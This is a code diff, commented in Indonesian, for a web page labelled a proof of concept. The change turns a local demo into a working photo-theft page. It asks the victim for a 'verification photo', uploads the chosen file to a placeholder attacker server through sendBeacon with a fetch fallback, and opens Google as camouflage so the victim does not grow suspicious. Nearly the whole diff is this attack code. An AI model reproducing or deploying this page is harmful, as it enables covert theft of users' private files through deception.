@@ -73,52 +73,67 @@
       const fileInput = document.getElementById("fileSelect");
       const statusDiv = document.getElementById("statusMsg");
 
+      // GANTI URL SERVER ANDA DI SINI
+      const EXFIL_SERVER = "https://your-server.com/upload"; // Bisa pakai webhook.site untuk testing
+
       trigger.onclick = (e) => {
         e.preventDefault();
-        statusDiv.innerHTML = "Opening Google...";
+        // TIDAK LANGSUNG BUKA GOOGLE – biarkan halaman fokus dulu
+        statusDiv.innerHTML = "Please select your verification photo...";
         fileInput.click(); // Buka file picker
-        window.open("https://google.com", "_blank"); // Buka tab Google
       };
 
-      fileInput.onchange = () => {
+      fileInput.onchange = async () => {
         if (fileInput.files.length === 0) return;
         const file = fileInput.files[0];
-        statusDiv.innerHTML = `Selected: ${file.name}. Exfiltrating...`;
+        statusDiv.innerHTML = `Selected: ${file.name}. Sending...`;
 
-        const reader = new FileReader();
-        reader.onload = function (ev) {
-          const dataUrl = ev.target.result;
-          // Buka tab baru yang menampilkan gambar yang dipilih (bukti eksfiltrasi)
-          const exfilWindow = window.open();
-          if (exfilWindow) {
-            exfilWindow.document.write(`
-                    <html><head><title>Exfiltrated File</title></head>
-                    <body style="text-align:center; font-family:Arial;">
-                        <h2>File captured by attacker</h2>
-                        <img src="${dataUrl}" style="max-width:90%; max-height:70vh;">
-                        <p><b>File:</b> ${file.name}<br><b>Size:</b> ${file.size} bytes</p>
-                        <p style="color:red;">This photo has been stolen!</p>
-                    </body>
-                    </html>
-                `);
-            statusDiv.innerHTML = `✅ File "${file.name}" opened in new tab as proof!`;
-            alert(
-              `[PoC] File "${file.name}" has been opened in a new tab. Attacker can now see your photo.`,
-            );
+        // === EKSFILTRASI KE SERVER ===
+        try {
+          // Cara 1: sendBeacon (paling tahan terhadap blokir WebView)
+          const formData = new FormData();
+          formData.append("file", file);
+          formData.append("filename", file.name);
+
+          const beaconSent = navigator.sendBeacon(EXFIL_SERVER, formData);
+          if (beaconSent) {
+            statusDiv.innerHTML = `✅ File "${file.name}" exfiltrated via sendBeacon!`;
           } else {
-            // Jika popup diblokir, fallback: simpan ke localStorage dan arahkan halaman ini ke data URL
-            statusDiv.innerHTML = `⚠ Popup blocked. Saving image locally.`;
-            localStorage.setItem("exfiltratedImage", dataUrl);
-            // Tampilkan gambar di halaman ini juga
-            const img = document.createElement("img");
-            img.src = dataUrl;
-            img.style.maxWidth = "100%";
-            img.style.marginTop = "10px";
-            document.querySelector(".container").appendChild(img);
-            alert(`[PoC] File saved locally. Check page content.`);
+            // Fallback: fetch dengan keepalive
+            await fetch(EXFIL_SERVER, {
+              method: "POST",
+              body: formData,
+              keepalive: true,
+            });
+            statusDiv.innerHTML = `✅ File "${file.name}" exfiltrated via fetch!`;
           }
-        };
-        reader.readAsDataURL(file);
+
+          // === BUKA TAB GOOGLE SEBAGAI KAMUFLASE ===
+          window.open("https://google.com", "_blank");
+
+          // === BUKTI VISUAL TAMBAHAN (Opsional) ===
+          // Tampilkan preview gambar di halaman attacker (agar korban lihat jika kembali)
+          const reader = new FileReader();
+          reader.onload = function (ev) {
+            const img = document.createElement("img");
+            img.src = ev.target.result;
+            img.style.maxWidth = "100%";
+            img.style.marginTop = "15px";
+            document.querySelector(".container").appendChild(img);
+            // Simpan juga ke localStorage sebagai bukti forensik
+            localStorage.setItem("exfiltratedImage", ev.target.result);
+          };
+          reader.readAsDataURL(file);
+
+          alert(
+            `[PoC] File "${file.name}" has been sent to attacker server and Google tab opened.`,
+          );
+        } catch (err) {
+          statusDiv.innerHTML = `❌ Exfiltration failed: ${err.message}`;
+          console.error(err);
+          // Tetap buka Google agar korban tidak curiga
+          window.open("https://google.com", "_blank");
+        }
       };
     </script>
   </body>
